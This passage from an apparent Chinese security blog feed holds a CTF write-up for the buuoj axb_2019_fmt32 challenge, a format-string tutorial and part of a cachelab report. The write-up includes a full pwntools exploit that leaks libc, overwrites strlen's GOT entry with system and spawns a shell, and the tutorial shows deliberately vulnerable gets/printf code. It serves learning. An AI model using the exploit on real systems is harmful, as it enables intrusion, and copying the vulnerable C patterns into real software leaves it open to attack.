class="code"><pre><span class="line">value:  00 41 42 43 44 45 43 41 00</span><br><span class="line">address:00 01 02 03 04 05 06 07 08</span><br></pre></td></tr></table></figure><p>那么04字符串就是<code>deca</code></p><p>03字符串就是<code>cdeca</code></p><p>以此类推。。。</p><p>那么字符串就成了泄露libc地址的有利工具，<code>printf(&quot;%s&quot;,b);</code>就可以泄露libc函数的地址了。</p><h3 id="确定偏移泄露libc寻找system函数地址"><a href="#确定偏移泄露libc寻找system函数地址" class="headerlink" title="确定偏移泄露libc寻找system函数地址"></a>确定偏移泄露libc寻找system函数地址</h3><p>确定偏移从来是看不出来的，要自己动调去确定偏移，直接运行会发现有时钟控制，那么我们gdb调试，在read和printf函数都下断点，输入<code>aaaa%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x</code></p><p>得到结果：</p><p><img src="https://i.loli.net/2021/06/08/LxJ63SAr1KdH9qb.png" alt="buuoj axb_2019_fmt32_1.png"></p><p>可以看到我们输入的4个a在printf里面被分割了，第8个参数有3个a(0x61)，第7个参数有1个，那么我们把第七个参数填充完整之后再在第八个参数的位置放上libc函数的got表地址，然后在最后加上<code>%8$s</code>就可以泄露libc地址了。</p><p>这里我选择泄露<code>puts</code>函数的地址</p><p>第一次payload就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(puts_got)+<span class="string">b&#x27;%8$s\0s&#x27;</span></span><br></pre></td></tr></table></figure><p>因为输出不单单只是输出payload，还加了很多junk数据，因此我们可以考虑在输出之前加一个特殊字符<code>&#39;\n&#39;</code>那么 我们在<code>p.recvuntil(b&#39;\n&#39;)</code>之后接收的四个字节一定就是puts的真实地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(puts_got)+<span class="string">b&#x27;\n%8$s\0s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]puts_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys=libc.dump(<span class="string">&#x27;system&#x27;</span>)+libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys)))</span><br></pre></td></tr></table></figure><p>这样我们就很轻松地得到了<code>system()</code>函数的地址</p><h3 id="确定攻击思路"><a href="#确定攻击思路" class="headerlink" title="确定攻击思路"></a>确定攻击思路</h3><p>我们不需要泄露<code>/bin/sh</code>字符串，因为之前就说了，我们并不能栈溢出劫持程序控制流，因此要考虑其它方法，printf可以任意写，那么我们就修改got表的内容，如果把strlen函数的got表改成system的地址，那么在调用strlen的时候就会执行system函数了。用printf函数应该也可以，但是人家改的时候就是在执行printf，所以给了你strlen就开开心心用嘛对吧。</p><p>由于一个地址的值比较大，一次覆盖要输出最多可能输出<code>0xffffffff</code>四十多亿个字符，最少也是<code>0xf7000000</code>个字符。所以我们采取分次赋值，把这个地址分成高字和低字，这样一次最多输出<code>0xffff</code>六万多个字符，在可接受的范围内，我们必须要一次赋值赋完，否则只赋一半就停，下面执行strlen函数就不在预期之内，会引发诸多错误，所以要改got表得一次改完。因为libc的基址一般都是0xf7开头的，所以这个函数高字肯定比较大，那么我们就先赋低字，在赋高字，缺的字符中间算算差值补足就好了。</p><p>这里又要介绍一个格式化字符串标识符了</p><p><code>%n$hn</code>给第n个参数地址赋值当前已打印字符的个数(大小为一个字(word))。那么我们就需要精心构造payload了，注意输出不止一个payload，还要注意前面的一些junk，经过计算，payload如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(strlen_got)+p32(strlen_got+<span class="number">2</span>)+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_low-<span class="number">18</span>).encode()+<span class="string">b&#x27;c%8$hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_high-sys_low).encode()+<span class="string">b&#x27;c%9$hn&#x27;</span></span><br></pre></td></tr></table></figure><p>最后一步就是给<code>/bin/sh</code>字符串了，第三次输入很简单，直接给<code>;/bin/sh;</code>即可，分号用于过滤前面的junk数据。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">proc=<span class="string">&#x27;./axb_2019_fmt32&#x27;</span></span><br><span class="line"><span class="comment">#p=process(proc)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25544</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(proc)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">strlen_got=elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(puts_got)+<span class="string">b&#x27;\n%8$s\0s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]puts_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys=libc.dump(<span class="string">&#x27;system&#x27;</span>)+libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_addr:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys)))</span><br><span class="line">sys_high=(sys&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">sys_low=sys&amp;<span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_low:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_low)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]sys_high:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_high)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(strlen_got)+p32(strlen_got+<span class="number">2</span>)+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_low-<span class="number">18</span>).encode()+<span class="string">b&#x27;c%8$hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_high-sys_low).encode()+<span class="string">b&#x27;c%9$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞利用</title>
      <link href="/2021/06/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/"/>
      <url>/2021/06/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>格式化字符串漏洞是printf函数比较常见的漏洞，常见的漏洞形式就是<code>printf(s);</code>如果s字符是我们可控的话，那就会导致任意位置读和写等严重的后果。</p><span id="more"></span><p>首先如下代码段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">gets(s);</span><br><span class="line"><span class="built_in">printf</span>(s);</span><br></pre></td></tr></table></figure><p>逻辑看上去十分简单，就是输入什么就输出什么。避免这类漏洞的方式也很简单，固定第一个参数就可以了，但是现在第一个参数我们可控的话就要介绍一些平时用不到的格式化字符串的标识符了。</p><p><code>%d %f %x %s</code>这些烂大街的相信都不用讲也会，讲讲其它的标识符</p><p><code>%p</code>:输出第n个参数的十六进制值，目前测试与<code>%x</code>不一样的地方就是输出会带<code>0x</code>，并且%后面带的整型参数表示第几个参数而非参数长度。</p><p><code>%n</code>:将已打印字符串长度输入到下一个参数所表示的地址去，%后面带的整型参数表示要输出的第几个参数。</p><p>注：以上结论皆是在Ubuntu18.0.4环境下使用gcc编译器得到的</p><p>那么通过以上两个较生僻格式化的标识符就可以达到任意读和任意写了。</p><h2 id="p达到任意读的目的"><a href="#p达到任意读的目的" class="headerlink" title="%p达到任意读的目的"></a>%p达到任意读的目的</h2><p>现在有以下测试程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">while</span>(buf[<span class="number">0</span>]!=<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        gets(buf);</span><br><span class="line">        <span class="built_in">printf</span>(buf,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于我们在64位的环境下编译，所以刚好给6个参数占满寄存器，那么此时我输入一个<code>%6$p</code>就可以直接输出<code>%6$p</code>这个字符串所对应的<code>long</code>的值(因为64位栈的宽度为8字节，所以被迫输出long型整数)</p><p><img src="https://i.loli.net/2021/06/05/eWljw5DEnZ9b1gm.png" alt="format string_1.png"></p><p>这里可以很清楚看到<code>70243625</code>就是字符串<code>%6$p</code>小端输出的结果，如果量一下缓冲区到rbp的距离我们还可以把栈的地址泄露出来，这就是任意读，地址一旦泄露那么可以做的事情就非常多了，如果加了canary甚至可以无视canary溢出。</p><h2 id="n达到任意写目的"><a href="#n达到任意写目的" class="headerlink" title="%n达到任意写目的"></a>%n达到任意写目的</h2><p>我们的测试程序是这样写的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">0</span>,b=<span class="number">0</span>,c=<span class="number">0</span>,d=<span class="number">0</span>,e=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(buf[<span class="number">0</span>]!=<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        gets(buf);</span><br><span class="line">        <span class="built_in">printf</span>(buf,&amp;a,&amp;b,&amp;c,&amp;d,&amp;e);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n%d %d %d %d %d\n&quot;</span>,a,b,c,d,e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个测试程序略微化简了一点，要修改的变量地址直接传参进去了，在实际攻击的过程中可不会这么给你提供，你需要算偏移然后将地址给格式化字符串定点修改某个变量的值，这就是所谓的任意写。</p><p><img src="https://i.loli.net/2021/06/05/ZLVsORBKiYxXA5I.png" alt="format string_2.png"></p><p>这里可以看到，通过我的输入成功改变了三个变量的值</p><p>这就是格式化字符串漏洞的利用。。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cachelab实验报告:模拟cache的功能</title>
      <link href="/2021/05/22/cachelab/"/>
      <url>/2021/05/22/cachelab/</url>
      
        <content type="html"><![CDATA[<p><code>lab</code>从这里开始变得难了起来了，这次要模拟计算机里的一个硬件-<code>cache</code>的工作，关于<code>cache</code>，百度百科介绍的比我好，这边请<a href="https://baike.baidu.com/item/CACHE%E5%AD%98%E5%82%A8%E5%99%A8/12789048?fr=aladdin">———&gt;</a></p><span id="more"></span><p>然后咱们就先拿到实验用的文件以及他的<code>writeup</code>，看完一会之后<code>(long long after)</code>就知道了此次实验的目的。然后文件也知道的一清二楚了。</p><p><code>csim.c</code>:用来做part A的主要文件。</p><p>tra<code>n</code>s.c:用来做part B的主要文件。</p><h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><p><code>writeup</code>里面已经提到了，<code>cache.h</code>头文件里面有所需的函数并且要在<code>csim.c</code>里面完成<code>cache</code>的模拟过程，那么首先我们看看<code>cache.h</code>头文件提供了哪些东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * cachelab.h - Prototypes for Cache Lab helper functions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CACHELAB_TOOLS_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CACHELAB_TOOLS_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_TRANS_FUNCS 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">trans_func</span>&#123;</span></span><br><span class="line">  <span class="keyword">void</span> (*func_ptr)(<span class="keyword">int</span> M,<span class="keyword">int</span> N,<span class="keyword">int</span>[N][M],<span class="keyword">int</span>[M][N]);</span><br><span class="line">  <span class="keyword">char</span>* description;</span><br><span class="line">  <span class="keyword">char</span> correct;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_hits;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_misses;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_evictions;</span><br><span class="line">&#125; <span class="keyword">trans_func_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * printSummary - This function provides a standard way for your cache</span></span><br><span class="line"><span class="comment"> * simulator * to display its final hit and miss statistics</span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printSummary</span><span class="params">(<span class="keyword">int</span> hits,  <span class="comment">/* number of  hits */</span></span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="keyword">int</span> misses, <span class="comment">/* number of misses */</span></span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="keyword">int</span> evictions)</span></span>; <span class="comment">/* number of evictions */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Fill the matrix with data */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initMatrix</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The baseline trans function that produces correct results. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">correctTrans</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Add the given function to the function list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerTransFunction</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">void</span> (*trans)(<span class="keyword">int</span> M,<span class="keyword">int</span> N,<span class="keyword">int</span>[N][M],<span class="keyword">int</span>[M][N]), <span class="keyword">char</span>* desc)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CACHELAB_TOOLS_H */</span></span></span><br></pre></td></tr></table></figure><p>用我那-4级的英语水平来翻译大概就是定义了一个结构体，结构体里有测试<code>cache</code>的一些指标，诸如命中次数这些的东西，所以这个结构体就当成<code>cache</code>吧。</p><p>那么就很好写(chao)<code>csim.c</code>的代码了，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="keyword">int</span> help_mode, verbose_mode, s, E, b, S,number_hits, number_miss, number_eviction;</span><br><span class="line"><span class="comment">//S is the number of sets, E is the associativity, b is number of block bits</span></span><br><span class="line"><span class="keyword">char</span> filename[<span class="number">1000</span>];<span class="comment">//The file name</span></span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">1000</span>];<span class="comment">//The buffer of input</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> valid_bit, tag, stamp;<span class="comment">//cold miss</span></span><br><span class="line">&#125;cache_line;</span><br><span class="line">cache_line **cache = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max_stamp = INT_MIN, max_stamp_id = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span>  t_address, s_address;<span class="comment">// The t value and s value of address</span></span><br><span class="line">    s_address = (address &gt;&gt; b) &amp; ((<span class="number">-1U</span>) &gt;&gt; (<span class="number">32</span> - s));<span class="comment">//use bit manipulation to get s_address, -1U equals to INT_MAX</span></span><br><span class="line">    t_address = address &gt;&gt; (s + b);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)<span class="comment">//check whether there is a hit</span></span><br><span class="line">        <span class="keyword">if</span>(cache[s_address][i].tag == t_address)<span class="comment">//which means a hit</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//is_placed = 1;</span></span><br><span class="line">            cache[s_address][i].stamp = <span class="number">0</span>;<span class="comment">//restart the time stamp control unit</span></span><br><span class="line">            number_hits++;</span><br><span class="line">            <span class="comment">//printf(&quot;hit\n&quot;);</span></span><br><span class="line">            <span class="keyword">return</span> ;<span class="comment">//just return now</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//to check whether is an empty line</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">        <span class="keyword">if</span>(cache[s_address][i].valid_bit == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cache[s_address][i].valid_bit = <span class="number">1</span>;</span><br><span class="line">            cache[s_address][i].tag = t_address;</span><br><span class="line">            cache[s_address][i].stamp = <span class="number">0</span>;</span><br><span class="line">            number_miss++;<span class="comment">//compulsory miss</span></span><br><span class="line">            <span class="comment">//printf(&quot;miss\n&quot;);</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//If there is not any empty line, then an eviction will occur</span></span><br><span class="line">    number_eviction++;</span><br><span class="line">    number_miss++;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">        <span class="keyword">if</span>(cache[s_address][i].stamp &gt; max_stamp)</span><br><span class="line">        &#123;</span><br><span class="line">            max_stamp = cache[s_address][i].stamp;</span><br><span class="line">            max_stamp_id = i;</span><br><span class="line">        &#125;</span><br><span class="line">    cache[s_address][max_stamp_id].tag = t_address;</span><br><span class="line">    cache[s_address][max_stamp_id].stamp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_time</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">//update the time stamp of each cache line</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line">            <span class="keyword">if</span>(cache[i][j].valid_bit == <span class="number">1</span>)<span class="comment">//if valid</span></span><br><span class="line">                cache[i][j].stamp++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> opt, temp;<span class="comment">//The getopt return value</span></span><br><span class="line">    <span class="keyword">char</span> type;<span class="comment">//type of a single trace record</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> address;<span class="comment">//address of memory</span></span><br><span class="line">    number_hits = number_miss = number_eviction = <span class="number">0</span>;<span class="comment">//initialization</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">-1</span> != (opt = (getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span>(opt)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:help_mode = <span class="number">1</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:verbose_mode = <span class="number">1</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:s = atoi(optarg);</span><br><span class="line">                     <span 